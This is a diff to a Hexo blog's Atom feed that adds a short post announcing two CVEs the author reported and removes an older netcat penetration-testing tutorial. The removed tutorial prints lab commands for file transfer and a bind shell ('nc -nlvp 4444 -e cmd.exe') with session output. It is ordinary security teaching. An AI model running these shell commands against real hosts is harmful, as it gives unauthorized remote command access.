@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2026-03-05T15:54:49.005Z</updated>
+  <updated>2026-06-19T03:06:28.801Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Two CVE vulnerabilities Approved</title>
+    <link href="http://example.com/2026/06/18/CVE-list/"/>
+    <id>http://example.com/2026/06/18/CVE-list/</id>
+    <published>2026-06-19T02:38:45.000Z</published>
+    <updated>2026-06-19T03:06:28.801Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code> A few months ago, I submitted two CVE vulnerabilities, and they were approved. The assigned IDs are CVE-2026-37697 and CVE-2026-37698, with CVSS scores of 7.5 and 9.3 respectively.</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;pre&gt;&lt;code&gt; A few months ago, I submitted two CVE vulnerabilities, and they were approved. The assigned IDs are CVE-2026-37697 and CVE-2026-</summary>
+      
+    
+    
+    
+    <category term="Web security" scheme="http://example.com/categories/Web-security/"/>
+    
+    
+    <category term="Web security" scheme="http://example.com/tags/Web-security/"/>
+    
+    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
+    
+  </entry>
   
   <entry>
     <title>Web security - CORS</title>
@@ -529,32 +555,6 @@ An issue in FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary </summa
     <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
     
     <category term="Socat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Netcat</title>
-    <link href="http://example.com/2016/12/01/Pentest-nc/"/>
-    <id>http://example.com/2016/12/01/Pentest-nc/</id>
-    <published>2016-12-02T04:04:37.000Z</published>
-    <updated>2023-10-21T22:00:01.691Z</updated>
-    
-    <content type="html"><![CDATA[<p>Netcat first released in 1995(!) by <em>Hobbit</em> is one of the “original” network penetration testing<br>tools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”.<br>The clearest definition of Netcat is from <em>Hobbit</em> himself: a simple “utility which reads and writes<br>data across network connections, using TCP or UDP protocols.</p><ol><li>Connecting to a TCP&#x2F;UDP Port</li></ol><p>We can use client mode to connect to any TCP&#x2F;UDP port, allowing us to:<br>• Check if a port is open or closed.<br>• Read a banner from the service listening on a port.<br>• Connect to a network service manually.</p><p>Example:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.11.10.2 110</span><br></pre></td></tr></table></figure><p><code>-n</code> option to skip DNS name resolution;<br><code>-v</code> to add some verbosity;</p><p>Output:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(UNKNOWN) [10.11.10.2] 110 (pop3) open</span><br><span class="line">+OK Dovecot ready.</span><br><span class="line">USER offsec</span><br><span class="line">+OK</span><br><span class="line">PASS offsec</span><br><span class="line">-ERR [AUTH] Authentication failed.</span><br><span class="line">quit</span><br><span class="line">+OK Logging out</span><br></pre></td></tr></table></figure><ol start="2"><li>Listening on a TCP&#x2F;UDP Port</li></ol><p>Example:</p><p>First , server start listening: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Then client try to connect server,and send “hello world”: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.136 4444</span><br><span class="line">(UNKNOWN) [192.168.244.136] 4444 (?) open</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>The server will receive message “hello world”:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 47386</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><ol start="3"><li>Transferring Files with Netcat</li></ol><p>From Server:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 &gt; mync.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>From client : </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444 &lt; /home/kali/Desktop/nc.exe     </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Notice that we have not received any feedback from Netcat about our file upload progress. In this<br>case, since the file we are uploading is small, we can just wait a few seconds, then check whether<br>the file has been fully uploaded to the Windows machine by attempting to run it:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt;mync -h</span><br><span class="line">[v1.10-47]</span><br><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ... </span><br><span class="line">listen for inbound:     nc -l -p port [-options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -c shell commands       as `-e&#x27;; use /bin/sh to exec [dangerous!!]</span><br><span class="line">        -e filename             program to exec after connect [dangerous!!]</span><br><span class="line">        -b                      allow broadcasts</span><br><span class="line">        ...</span><br><span class="line">port numbers can be individual or ranges: lo-hi [inclusive];</span><br><span class="line">hyphens in port names must be backslash escaped (e.g. &#x27;ftp\-data&#x27;).</span><br></pre></td></tr></table></figure><ol start="4"><li>Netcat Bind Shell Scenario</li></ol><p>Run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Local Area Connection:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::6d45:b51c:b367:2f09%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.244.143</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.244.2</span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.localdomain:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;</span><br></pre></td></tr></table></figure><p>This is indeed a “gaping security hole”!</p><ol start="5"><li>Reverse Shell Scenario<br>Server:<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></li></ol><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Then server side shows like:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 35156</span><br><span class="line">ls</span><br><span class="line">code.desktop</span><br><span class="line">nc.exe</span><br><span class="line"></span><br><span class="line">ip address show eth0 | grep inet</span><br><span class="line">inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Netcat first released in 1995(!) by &lt;em&gt;Hobbit&lt;/em&gt; is one of the “original” network penetration testing&lt;br&gt;tools and is so versatile tha</summary>
-      
-    
-    
-    
-    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
-    
-    <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
-    
-    <category term="Netcat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"/>
     
     
   </entry>
